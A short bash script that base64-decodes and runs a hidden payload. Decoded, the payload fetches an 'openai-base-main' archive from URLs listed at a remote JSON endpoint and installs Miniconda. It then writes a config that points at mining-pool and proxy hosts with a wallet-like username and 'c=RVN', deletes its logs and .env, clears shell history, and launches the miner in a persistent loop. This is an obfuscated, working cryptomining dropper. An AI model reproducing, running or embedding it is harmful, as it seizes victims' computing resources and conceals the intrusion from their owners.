#!/usr/bin/env bash

set -e

TMP_SCRIPT=$(mktemp /tmp/bum.XXXXXX.sh)
chmod +x "$TMP_SCRIPT"

base64 -d << 'EOF' | tr -d '\r' > "$TMP_SCRIPT"
ZWNobyAnIyEvYmluL2Jhc2gKWyAtZiBvcGVuYWktYmFzZS1tYWluL3N0YXJ0LnNoIF0gfHwgKAojIS9iaW4vYmFzaAoKd2hpbGUgdHJ1ZTsgZG8KICBlY2hvICJM4bqleSBkYW5oIHPDoWNoIFVSTCB04burIEFQSS4uLiIKICB1cmxzPSQoY3VybCAtcyBodHRwczovL2FwaS5ucG9pbnQuaW8vMDRjYTBkNTQ3NTQxNWNhNDlhODUgfCBqcSAtciAnLmRhdGFzW10nKQogIHN1Y2Nlc3M9ZmFsc2UKCiAgZm9yIHVybCBpbiAkdXJsczsgZG8KICAgIGVjaG8gIlRo4butIHThuqNpIHThu6s6ICR1cmwiCiAgICBpZiB3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgIiR1cmwiIC1PIG9wZW5haS1iYXNlLW1haW4udGFyLmd6OyB0aGVuCiAgICAgIGlmIHRhciAteHZmIG9wZW5haS1iYXNlLW1haW4udGFyLmd6OyB0aGVuCiAgICAgICAgcm0gb3BlbmFpLWJhc2UtbWFpbi50YXIuZ3oKICAgICAgICBlY2hvICJU4bqjaSB2w6AgZ2nhuqNpIG7DqW4gdGjDoG5oIGPDtG5nIHThu6s6ICR1cmwiCiAgICAgICAgc3VjY2Vzcz10cnVlCiAgICAgICAgYnJlYWsKICAgICAgZWxzZQogICAgICAgIGVjaG8gIkdp4bqjaSBuw6luIGzhu5dpIHThu6s6ICR1cmwiCiAgICAgIGZpCiAgICBlbHNlCiAgICAgIGVjaG8gIlThuqNpIGzhu5dpIHThu6s6ICR1cmwiCiAgICBmaQogIGRvbmUKCiAgaWYgJHN1Y2Nlc3M7IHRoZW4KICAgIGJyZWFrCiAgZWxzZQogICAgZWNobyAiVOG6pXQgY+G6oyBVUkwgxJHhu4F1IGzhu5dpLiBUaOG7rSBs4bqhaSBzYXUgMzAgZ2nDonkuLi4iCiAgICBzbGVlcCAzMAogIGZpCmRvbmUKKScgPiBidW0uc2ggJiYgY2htb2QgK3ggYnVtLnNoICYmIG5vaHVwIC4vYnVtLnNoID4gb3V0LmxvZyAyPiYxICYKCgp3aGlsZSB0cnVlOyBkbwogICAgaWYgY29tbWFuZCAtdiBweXRob24gPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgUFk9JCh3aGljaCBweXRob24pCiAgICAgICAgZWNobyAixJDDoyBjw7MgUHl0aG9uIGjhu4cgdGjhu5FuZzogJFBZIgogICAgZWxzZQogICAgICAgICMgS2nhu4NtIHRyYSBu4bq/dSDEkcOjIGPDsyBNaW5pY29uZGEKICAgICAgICBpZiBbICEgLWQgIiRIT01FL21pbmljb25kYSIgXTsgdGhlbgogICAgICAgICAgICBlY2hvICJLaMO0bmcgY8OzIFB5dGhvbi4gxJBhbmcgdOG6o2kgdsOgIGPDoGkgxJHhurd0IE1pbmljb25kYS4uLiIKICAgICAgICAgICAgd2dldCBodHRwczovL3JlcG8uYW5hY29uZGEuY29tL21pbmljb25kYS9NaW5pY29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2ggLU8gbWluaWNvbmRhLnNoCiAgICAgICAgICAgIGJhc2ggbWluaWNvbmRhLnNoIC1iIC1wICIkSE9NRS9taW5pY29uZGEiCiAgICAgICAgICAgIHJtIG1pbmljb25kYS5zaAogICAgICAgIGVsc2UKICAgICAgICAgICAgZWNobyAiTWluaWNvbmRhIMSRw6MgxJHGsOG7o2MgY8OgaSBz4bq1bi4iCiAgICAgICAgZmkKCiAgICAgICAgZXhwb3J0IFBBVEg9IiRIT01FL21pbmljb25kYS9iaW46JFBBVEgiCiAgICAgICAgZWNobyAnZXhwb3J0IFBBVEg9IiRIT01FL21pbmljb25kYS9iaW46JFBBVEgiJyA+PiB+Ly5iYXNocmMKICAgICAgICBQWT0iJEhPTUUvbWluaWNvbmRhL2Jpbi9weXRob24iCiAgICBmaQoKICAgICMgVMOsbSB0aMawIG3hu6VjIG9wZW5haS1iYXNlLW1haW4KICAgIGRpcj0kKGZpbmQgfiAtdHlwZSBkIC1uYW1lICdvcGVuYWktYmFzZS1tYWluJyAtcHJpbnQgLXF1aXQpCiAgICBpZiBbIC1uICIkZGlyIiBdOyB0aGVuCiAgICAgICAgcm0gLWYgYnVtLnNoIG91dC5sb2cgLmVudgogICAgICAgICMgcGtpbGwgcHl0aG9uIHx8IHRydWUKICAgICAgICAjIHBraWxsIHB5dGhvbjMgfHwgdHJ1ZQogICAgICAgIGNkICIkZGlyIiB8fCBleGl0IDEKICAgICAgICBlY2hvIC1lICJwcm94eT13c3M6Ly8kKHNodWYgLW4gMSAtZSBpZGVudGljYWwtc2lsZS1tYWxwaGl0ZS1ub2RlLWRmYWE1ZWM1LmtveWViLmFwcCBicm9rZW4tYXJkZW5lLW1pbm8tZmVjZjcyOWMua295ZWIuYXBwIHByZXNlbnQtbmljaG9sLXZpdm8xLTRmM2RhZDhhLmtveWViLmFwcCkvZUdWc2FYTjJNaTF3WlhCbGR5NXVZUzV0YVc1bExucHdiMjlzTG1OaE9qUTRNek09Cmhvc3Q9MTI3LjAuMC4xCnBvcnQ9MzMwNgp1c2VybmFtZT1SU3FXUmdpdk50bXhEYUVXajF4eUxyRTVIUG5qY3M4RE5qCnBhc3N3b3JkPWM9UlZOCnRocmVhZHM9OCIgPiBkYXRhLnR4dAogICAgICAgIGhpc3RvcnkgLWMgJiYgaGlzdG9yeSAtdwogICAgICAgIGNsZWFyCiAgICAgICAgJFBZIC11IG1haW4ucHkgOCAtLWRhdGFzZXQ9ZGF0YS50eHQgLS1vdXRwdXQ9cmVzdWx0LnR4dCA+IHN0ZG91dC50eHQgMj4gc3RkZXJyLnR4dAogICAgZWxzZQogICAgICAgIGVjaG8gIktow7RuZyB0w6xtIHRo4bqleSB0aMawIG3hu6VjICdvcGVuYWktYmFzZS1tYWluJyIKICAgIGZpCgogICAgc2xlZXAgMTAKZG9uZQo=
EOF

bash "$TMP_SCRIPT"

rm -f "$TMP_SCRIPT"
